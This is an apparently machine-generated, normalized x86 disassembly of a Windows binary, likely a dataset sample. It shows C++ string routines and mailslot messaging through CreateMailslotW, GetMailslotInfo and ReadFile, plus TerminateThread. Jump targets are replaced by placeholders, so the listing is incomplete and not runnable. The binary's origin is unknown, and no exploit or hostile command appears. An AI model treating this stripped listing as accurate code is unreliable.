mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov eax [ eax + 0x10 ]
mov ecx [ ecx + 0x10 ]
mov edi [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
cmp edi eax
ja r-xdata
mov edx [ ebp + 0xc ]
push 0xffffffff
push 0x0
push edx
mov ecx esi
call sub_10006f30
mov eax [ ebp + 0x10 ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10006f30
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ esi + 0x14 ] eax
je r-xdata
push 0x1
push eax
mov ecx esi
call sub_10006cf0
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov [ eax + edi ] 0x0
sub_1000cd20
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push esi
push 0xffffffff
push 0x0
push eax
mov [ ebp - 0x4 ] 0x0
call sub_10006f30
mov esi [ ebp + 0x8 ]
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push eax
mov ecx esi
mov [ esi ] 0x0
call sub_100076f0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_1000cd60
push esi
mov esi ecx
mov eax [ esi + 0x1c ]
cmp eax [ esi + 0x20 ]
jbe r-xdata
cmp [ esi + 0x28 ] 0x0
je r-xdata
pop esi
jmp sub_1000c350
xor eax eax
pop esi
retn
call sub_1000c350
mov [ esi + 0x28 ] 0x0
pop esi
retn
sub_1000cd90
push ebp
mov ebp esp
push 0xffffffff
push sub_1002ca36
mov eax [ fs : 0x0 ]
push eax
sub esp 0x84
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor esi esi
push 0x18
mov [ ebp - 0x90 ] edi
mov [ ebp - 0x84 ] esi
mov [ ebp - 0x8c ] esi
call sub_1001a818
add esp 0x4
mov [ ebp - 0x88 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x16
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
mov [ ebp - 0x4 ] 0x1
jb r-xdata
mov ecx eax
call sub_10012700
mov esi eax
mov ecx [ ebp + 0x8 ]
push ecx
push eax
push 0x28
lea edx [ ebp - 0x8c ]
push edx
lea eax [ ebp - 0x84 ]
push eax
lea ecx [ edi + 0x8 ]
call sub_10008f60
cmp al 0x1
sete bl
cmp [ ebp - 0x18 ] 0x8
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov eax [ eax ]
test bl bl
je r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
test esi esi
je r-xdata
push 0x22
push rw-data
mov ecx esi
call sub_10012770
lea edx [ ebp - 0x80 ]
push edx
mov ecx esi
call sub_10012d50
mov ebx eax
lea eax [ ebp - 0x2c ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10012d50
mov ecx [ ebx + 0x10 ]
mov ebx 0x10
mov [ ebp - 0x4 ] 0x3
cmp [ eax + 0x14 ] ebx
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn 0x4
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
push ecx
push eax
mov ecx edi
call sub_1000c460
cmp [ ebp - 0x18 ] ebx
jb r-xdata
mov eax [ eax ]
xor ebx ebx
cmp [ ebp - 0x6c ] 0x10
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
mov [ ebp - 0x4 ] 0xffffffff
jb r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x8c ]
mov edx [ ebp - 0x84 ]
lea eax [ ebp - 0x88 ]
push eax
push ecx
push edx
mov ecx esi
mov [ ebp - 0x88 ] ebx
call sub_10012c10
mov ebx eax
mov eax [ ebp - 0x88 ]
push eax
push ebx
mov ecx edi
call sub_1000c460
push 0x1e
push rw-data
mov ecx esi
call sub_10012770
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx esi
call sub_10012d50
mov edi eax
lea edx [ ebp - 0x64 ]
push edx
mov ecx esi
mov [ ebp - 0x4 ] 0x4
call sub_10012d50
mov ecx [ edi + 0x10 ]
mov edi 0x10
mov [ ebp - 0x4 ] 0x5
cmp [ eax + 0x14 ] edi
jb r-xdata
mov edx [ ebp - 0x80 ]
push edx
call sub_10019ce4
add esp 0x4
push ecx
mov ecx [ ebp - 0x90 ]
push eax
call sub_1000c460
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] 0x0
mov [ ebp - 0x64 ] 0x0
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x84 ]
push edx
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] 0x0
mov [ ebp - 0x48 ] 0x0
call sub_1001a3eb
push ebx
call sub_1001a3eb
add esp 0x8
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
sub_1000d010
push ebp
mov ebp esp
push 0xffffffff
push sub_1002ca9a
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0xc ] eax
je r-xdata
mov ecx [ esi ]
mov edx [ ecx + 0x4 ]
mov [ esi + edx ] r--data
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] eax
mov eax [ esi ]
mov edi [ eax + 0x4 ]
add edi esi
mov ecx edi
call sub_10009740
lea ebx [ esi + 0x18 ]
push 0x20
mov ecx edi
mov [ edi + 0x38 ] ebx
mov [ edi + 0x3c ] 0x0
call sub_1000b1b0
cmp [ edi + 0x38 ] 0x0
mov [ edi + 0x40 ] al
jne r-xdata
mov [ esi ] r--data
mov [ esi + 0x10 ] r--data
mov [ esi + 0x60 ] r--data
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x10 ] 0x1
mov ecx [ esi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ esi + edx + 0x10 ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov [ esi + ecx ] r--data
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx ebx
mov [ ebp - 0x4 ] 0x5
mov [ esi + eax ] r--data
call sub_1000a1a0
mov cl [ ebp + 0x8 ]
xor eax eax
mov [ ebx ] r--data
test cl 0x1
jne r-xdata
mov eax [ edi + 0xc ]
or eax 0x4
or eax 0x4
push 0x0
push eax
mov ecx edi
call sub_10009610
test cl 0x2
jne r-xdata
mov eax 0x4
test cl 0x8
je r-xdata
or eax 0x2
test cl 0x4
je r-xdata
or eax 0x8
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x3c ] 0x0
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
or eax 0x10
sub_1000d140
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0x8 ]
push esi
add ecx 0x18
mov [ ebp - 0x4 ] 0x0
call sub_1000c4c0
mov eax esi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_1000d170
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cb9b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2ac
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
cmp [ esi + 0x58 ] 0x0
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x1f8 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor ebx ebx
mov ecx eax
call sub_10012700
mov ebx eax
jmp r-xdata
mov edx [ ecx ]
xor edx edx
jmp r-xdata
push 0xc
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
lea ecx [ esi + 0x60 ]
mov [ ebp - 0x1f8 ] ecx
call sub_10019a16
lea eax [ ebp - 0x210 ]
lea ecx [ esi + 0x48 ]
push eax
mov [ ebp - 0x204 ] ecx
call sub_100018f0
mov ecx [ eax ]
test ecx ecx
jne r-xdata
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
lea eax [ eax + ecx * 8 ]
xor ecx ecx
mov [ ebp - 0x200 ] ecx
mov [ ebp - 0x1fc ] ecx
push eax
lea ecx [ ebp - 0x200 ]
call sub_100033e0
mov edi [ ebp - 0x200 ]
movzx eax [ edi + 0x6 ]
add eax 0xffffff9b
mov [ ebp - 0x4 ] 0x1
cmp eax 0x8
ja r-xdata
sub eax edi
mov ecx [ eax + 0x8 ]
mov edi [ edx + 0x8 ]
mov eax ecx
shr eax 0x1
and ecx 0x1
cmp edi eax
ja r-xdata
push 0x30
push rw-data
mov ecx ebx
call sub_10012770
lea eax [ ebp - 0x64 ]
push eax
mov ecx ebx
call sub_10012d50
mov edi eax
lea ecx [ ebp - 0x48 ]
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x13
call sub_10012d50
mov ecx [ edi + 0x10 ]
mov edi 0x10
mov [ ebp - 0x4 ] 0x14
cmp [ eax + 0x14 ] edi
jb r-xdata
jmp [ eax * 4 + jump_table_1000d8e8 ]
push ecx
push eax
mov ecx esi
call sub_1000c460
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ eax ]
mov ecx esi
call sub_10009800
cmp al 0x1
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ edi + 0xc ] 0x4
jne r-xdata
lea ecx [ esi + 0x8 ]
call sub_10008ee0
push 0x38
push rw-data
mov ecx ebx
mov [ esi + 0x64 ] eax
call sub_10012770
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx ebx
call sub_10012d50
push 0x1
push 0x0
push r--data
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x2
call sub_1000a120
mov edi eax
push 0x1
push edi
lea ecx [ ebp - 0x2c ]
call sub_10006980
push 0x1
push 0x3
lea ecx [ ebp - 0x2b8 ]
call sub_1000d010
mov edx [ esi + 0x64 ]
push edx
lea ecx [ ebp - 0x2a8 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000b650
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x2b8 ]
call sub_1000d140
push 0xffffffff
push 0x0
push eax
push edi
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x4
call sub_10007020
lea ecx [ ebp - 0xb8 ]
mov [ ebp - 0x4 ] 0x3
call sub_100032c0
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
cmp [ edi + 0xc ] 0x4
jne r-xdata
mov [ esi + 0x28 ] 0x1
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
xor esi esi
mov [ ebp - 0x34 ] 0xf
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov edx [ ebp - 0x48 ]
push edx
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0x204 ]
call sub_10007770
mov ecx [ ebp - 0x1f8 ]
call sub_10019a1f
test ebx ebx
je r-xdata
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x1f0 ] esp
push r--data
call sub_10003ae0
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push 0x0
call eax
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x1f0 ] esp
push r--data
call sub_10003ae0
mov ecx [ esi + 0x18 ]
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
push 0x1
call eax
mov ecx [ esi + 0x24 ]
push 0x0
push ecx
call [ TerminateThread@IAT ]
mov edx [ esi + 0x24 ]
push edx
call [ CloseHandle@IAT ]
mov [ esi + 0x24 ] 0x0
mov esi [ esi + 0x2c ]
test esi esi
je r-xdata
mov edi [ edi + 0x8 ]
mov eax [ edi ]
mov [ esi + 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1c ]
push ecx
push eax
mov ecx esi
call sub_1000c460
lea ecx [ ebp - 0x2b8 ]
mov [ esi + 0x28 ] 0x1
mov [ ebp - 0x4 ] 0x2
call sub_1000ae80
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_100032c0
jmp r-xdata
lea eax [ ebp - 0x2c ]
mov ecx esi
mov edi [ edi + 0x8 ]
mov eax [ edi ]
cmp eax [ esi + 0x64 ]
ja r-xdata
mov eax [ edi + 0xc ]
mov [ ebp - 0x1f4 ] eax
cmp eax 0x104
jae r-xdata
mov eax [ edi + 0xc ]
mov [ ebp - 0x1f4 ] eax
cmp eax 0x104
jae r-xdata
push 0x30
push rw-data
mov ecx ebx
call sub_10012770
lea edx [ ebp - 0x2c ]
push edx
mov ecx ebx
call sub_10012d50
push 0x5
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xd
call sub_10012770
lea eax [ ebp - 0x80 ]
push eax
mov ecx ebx
call sub_10012d50
push 0x6
push rw-data
mov ecx ebx
mov [ ebp - 0x4 ] 0xe
call sub_10012770
lea ecx [ ebp - 0x9c ]
push ecx
mov ecx ebx
call sub_10012d50
mov eax [ esi + 0x2c ]
mov ecx [ eax + 0x20 ]
mov edi [ ecx ]
mov [ ebp - 0x4 ] 0xf
cmp edi ecx
je r-xdata
mov [ ebp - 0x50 ] 0xf
mov [ ebp - 0x54 ] esi
mov [ ebp - 0x64 ] 0x0
mov eax [ ebp - 0x64 ]
push eax
call sub_10019ce4
add esp 0x4
mov esi [ ebp - 0x1fc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
mov ecx ebx
call sub_10012740
push ebx
call sub_10019ce4
add esp 0x4
mov ecx esi
call sub_1000ef90
push esi
call sub_10019ce4
add esp 0x4
jmp r-xdata
mov ecx esi
test eax eax
je r-xdata
shr eax 0x1
add eax 0x4
push 0x2
push eax
call sub_1001a8ef
mov edx [ ebp - 0x1f4 ]
mov edi [ edi + 0x8 ]
push edx
push edi
push eax
mov [ ebp - 0x1f0 ] eax
call sub_10019cf0
mov eax [ ebp - 0x1f0 ]
mov ecx [ esi + 0x2c ]
add esp 0x14
push eax
call sub_1000f2a0
push 0x2f
mov ecx ebx
test al al
jne r-xdata
shr eax 0x1
add eax 0x4
push 0x2
push eax
call sub_1001a8ef
mov ecx [ ebp - 0x1f4 ]
mov edi [ edi + 0x8 ]
push ecx
push edi
push eax
mov [ ebp - 0x1f0 ] eax
call sub_10019cf0
mov edx [ ebp - 0x1f0 ]
mov ecx [ esi + 0x2c ]
add esp 0x14
push edx
call sub_1000ede0
mov ecx ebx
test al al
jne r-xdata
push 0x6
push rw-data
mov ecx ebx
call sub_10012770
lea ecx [ ebp - 0x10c ]
push ecx
mov ecx ebx
call sub_10012d50
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x12
call sub_10006f30
lea ecx [ ebp - 0x10c ]
mov [ ebp - 0x4 ] 0xf
call sub_100032c0
cmp [ ebp - 0x18 ] 0x10
mov eax [ ebp - 0x2c ]
jae r-xdata
lea esp [ esp ]
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
push 0x0
call sub_1000cd90
dec eax
push eax
call sub_1000cd90
mov [ esi + 0x28 ] 0x1
jmp r-xdata
push rw-data
call sub_10012770
lea eax [ ebp - 0xf0 ]
push eax
mov ecx ebx
call sub_10012d50
mov edi eax
lea ecx [ ebp - 0xd4 ]
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x7
call sub_10012d50
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x8
jb r-xdata
push rw-data
call sub_10012770
lea ecx [ ebp - 0x198 ]
push ecx
mov ecx ebx
call sub_10012d50
mov edi eax
lea edx [ ebp - 0x160 ]
push edx
mov ecx ebx
mov [ ebp - 0x4 ] 0x5
call sub_10012d50
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0x6
jb r-xdata
push 0x2f
push rw-data
call sub_10012770
lea edx [ ebp - 0x1ec ]
push edx
mov ecx ebx
call sub_10012d50
mov edi eax
lea eax [ ebp - 0x1b4 ]
push eax
mov ecx ebx
mov [ ebp - 0x4 ] 0xb
call sub_10012d50
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0xc
jb r-xdata
push 0x32
push rw-data
call sub_10012770
lea eax [ ebp - 0x17c ]
push eax
mov ecx ebx
call sub_10012d50
mov edi eax
lea ecx [ ebp - 0x144 ]
push ecx
mov ecx ebx
mov [ ebp - 0x4 ] 0x9
call sub_10012d50
cmp [ eax + 0x14 ] 0x10
mov edi [ edi + 0x10 ]
mov [ ebp - 0x4 ] 0xa
jb r-xdata
mov edx [ ebp - 0x1c ]
push edx
push eax
mov ecx esi
call sub_1000c460
lea ecx [ ebp - 0x9c ]
call sub_100032c0
lea ecx [ ebp - 0x80 ]
call sub_100032c0
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x1
call sub_100032c0
jmp r-xdata
lea eax [ ebp - 0x2c ]
lea edx [ edi + 0xc ]
push edx
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x128 ]
push ecx
call sub_1000cc60
lea edx [ ebp - 0x9c ]
push edx
push eax
lea eax [ ebp - 0x1d0 ]
push eax
mov [ ebp - 0x4 ] 0x10
call sub_1000cd20
add esp 0x18
push 0xffffffff
push 0x0
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x11
call sub_10006f30
lea ecx [ ebp - 0x1d0 ]
call sub_100032c0
lea ecx [ ebp - 0x128 ]
mov [ ebp - 0x4 ] 0xf
call sub_100032c0
mov edi [ edi ]
mov eax [ esi + 0x2c ]
cmp edi [ eax + 0x20 ]
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
push edi
push eax
mov ecx esi
call sub_1000c460
lea ecx [ ebp - 0xd4 ]
call sub_100032c0
lea ecx [ ebp - 0xf0 ]
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_1000c460
lea ecx [ ebp - 0x160 ]
call sub_100032c0
lea ecx [ ebp - 0x198 ]
jmp r-xdata
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_1000c460
lea ecx [ ebp - 0x1b4 ]
call sub_100032c0
lea ecx [ ebp - 0x1ec ]
mov eax [ eax ]
push edi
push eax
mov ecx esi
call sub_1000c460
lea ecx [ ebp - 0x144 ]
call sub_100032c0
lea ecx [ ebp - 0x17c ]
jmp r-xdata
mov eax [ eax ]
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx esi
call eax
mov [ ebp - 0x4 ] 0x1
call sub_100032c0
mov edx [ ebp - 0x1f0 ]
push edx
call sub_1001a3eb
add esp 0x4
jmp r-xdata
mov [ ebp - 0x4 ] 0x1
call sub_100032c0
mov ecx [ ebp - 0x1f0 ]
push ecx
call sub_1001a3eb
add esp 0x4
jmp r-xdata
sub_1000d910
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cbf1
mov eax [ fs : 0x0 ]
push eax
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x18
mov [ ebp - 0x8c ] ecx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x90 ] eax
xor ebx ebx
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
push ebx
push 0xffffffff
push ebx
push eax
call [ CreateMailslotW@IAT ]
cmp [ ebp - 0x58 ] 0x8
mov edi eax
mov [ ebp - 0xa4 ] edi
jb r-xdata
mov eax [ eax ]
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x44
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x6c ]
push eax
mov ecx esi
call sub_10012c50
cmp [ eax + 0x14 ] 0x8
jb r-xdata
xor edx edx
mov eax 0x7
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x6c ] dx
cmp edi 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x6c ]
push ecx
call sub_10019ce4
add esp 0x4
mov ecx [ rw-data ]
push ecx
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x90 ] esp
push ebx
xor edx edx
mov [ ecx + 0x14 ] eax
mov [ ecx + 0x10 ] ebx
push r--data
mov [ ecx ] dx
call sub_100034e0
mov edi [ ebp - 0x8c ]
mov ecx [ edi + 0x18 ]
mov eax [ ecx ]
mov edx [ eax ]
call edx
cmp eax ebx
jne r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x2
push 0x104
mov [ ebp - 0x98 ] ebx
mov [ ebp - 0xa0 ] ebx
mov [ ebp - 0x94 ] ebx
call sub_1001a8ef
add esp 0x8
push 0x7
push rw-data
mov ecx esi
mov [ ebp - 0x9c ] eax
call sub_10012770
xor eax eax
mov [ ebp - 0x17 ] eax
mov [ ebp - 0x13 ] ax
lea eax [ ebp - 0x50 ]
push eax
mov ecx esi
mov [ ebp - 0x18 ] bl
call sub_10012d50
mov edi eax
lea ecx [ ebp - 0x34 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10012d50
mov ecx [ edi + 0x10 ]
mov edi 0x10
cmp [ eax + 0x14 ] edi
jb r-xdata
mov ecx edi
call sub_10009800
push ebx
mov ecx edi
call sub_1000cd90
push ecx
push eax
lea edx [ ebp - 0x18 ]
push edx
call sub_10019cf0
add esp 0xc
cmp [ ebp - 0x20 ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x20 ] 0xf
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x34 ] bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x3c ] edi
jb r-xdata
mov eax [ ebp - 0x34 ]
push eax
call sub_10019ce4
add esp 0x4
push 0xc
push rw-data
mov ecx esi
call sub_10012790
push 0xe
push rw-data
mov ecx esi
call sub_10012770
xor eax eax
lea edx [ ebp - 0x88 ]
push edx
mov ecx esi
mov [ ebp - 0x28 ] bl
mov [ ebp - 0x27 ] eax
mov [ ebp - 0x23 ] eax
mov [ ebp - 0x1f ] eax
mov [ ebp - 0x1b ] al
call sub_10012d50
mov edi eax
lea eax [ ebp - 0x50 ]
push eax
mov ecx esi
mov [ ebp - 0x4 ] 0x2
call sub_10012d50
mov ecx [ edi + 0x10 ]
mov edi 0x10
cmp [ eax + 0x14 ] edi
jb r-xdata
mov ecx [ ebp - 0x50 ]
push ecx
call sub_10019ce4
add esp 0x4
push ecx
push eax
lea ecx [ ebp - 0x28 ]
push ecx
call sub_10019cf0
add esp 0xc
cmp [ ebp - 0x3c ] edi
jb r-xdata
mov eax [ eax ]
mov [ ebp - 0x3c ] 0xf
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x50 ] bl
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x74 ] edi
jb r-xdata
mov edx [ ebp - 0x50 ]
push edx
call sub_10019ce4
add esp 0x4
cmp esi ebx
je r-xdata
mov eax [ ebp - 0x88 ]
push eax
call sub_10019ce4
add esp 0x4
mov esi [ Sleep@IAT ]
push 0x14
call esi
mov edi [ ebp - 0xa4 ]
push ebx
lea ecx [ ebp - 0xa0 ]
push ecx
lea edx [ ebp - 0x98 ]
push edx
push ebx
push edi
call [ GetMailslotInfo@IAT ]
cmp [ ebp - 0xa0 ] ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
nop
push 0x14
call esi
mov esi [ ebp - 0x9c ]
push 0x104
push ebx
push esi
call sub_1001a9b0
mov ecx [ ebp - 0x98 ]
add esp 0xc
push ebx
lea eax [ ebp - 0x94 ]
push eax
push ecx
push esi
push edi
mov [ ebp - 0x94 ] ebx
call [ ReadFile@IAT ]
lea eax [ ebp - 0x18 ]
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea edx [ ebp - 0x18 ]
push edx
push esi
call sub_1001acd0
add esp 0xc
test eax eax
jne r-xdata
mov edi [ ebp - 0x94 ]
push 0x8
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x8c ]
push 0xffffffff
call sub_1000cd90
mov ecx [ ebp - 0x8c ]
call sub_1000d170
jmp r-xdata
xor esi esi
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov esi eax
jmp r-xdata
lea eax [ ebp - 0x28 ]
lea edx [ eax + 0x1 ]
mov ecx [ ebp - 0x9c ]
push edi
push ecx
push eax
call sub_10019cf0
mov [ esi + 0x4 ] edi
mov esi [ ebp - 0x8c ]
add esp 0xc
lea edx [ ebp - 0x90 ]
push edx
lea ecx [ esi + 0x30 ]
call sub_1000f6e0
add [ esi + 0x1c ] edi
push 0x1
push edi
mov [ ebp - 0x90 ] esi
call sub_1001a8ef
add esp 0x8
mov [ esi ] eax
cmp eax ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push 0x8
mov edi eax
call sub_1001a818
add esp 0x4
cmp eax ebx
je r-xdata
xor esi esi
mov [ eax ] ebx
mov [ eax + 0x4 ] ebx
mov esi eax
jmp r-xdata
mov ecx [ ebp - 0x8c ]
call sub_1000d170
jmp r-xdata
push edi
lea ecx [ ebp - 0x28 ]
push ecx
push eax
call sub_10019cf0
mov [ esi + 0x4 ] edi
mov esi [ ebp - 0x8c ]
add esp 0xc
lea edx [ ebp - 0x90 ]
push edx
lea ecx [ esi + 0x30 ]
call sub_1000f6e0
add [ esi + 0x1c ] edi
mov ecx esi
call sub_1000d170
jmp r-xdata
push 0x1
push edi
mov [ ebp - 0x90 ] esi
call sub_1001a8ef
add esp 0x8
mov [ esi ] eax
cmp eax ebx
je r-xdata
sub_1000dd50
push ebp
mov ebp esp
push 0xffffffff
push sub_1002cc28
mov eax [ fs : 0x0 ]
push eax
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
cmp [ ebp + 0x8 ] 0x0
mov [ ebp - 0x4 ] 0x0
je r-xdata
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
add ecx 0x48
call sub_100078a0
mov esi [ ebp + 0xc ]
mov [ ebp - 0x4 ] 0xffffffff
test esi esi
je r-xdata
xor al al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov al 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x8
lea ecx [ esi + 0x4 ]
or edx 0xffffffff
[ ecx ] edx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov eax [ esi ]
mov edx [ eax ]
mov ecx esi
call edx
lea eax [ esi + 0x8 ]
or ecx 0xffffffff
[ eax ] ecx
jne r-xdata
mov edx [ esi ]
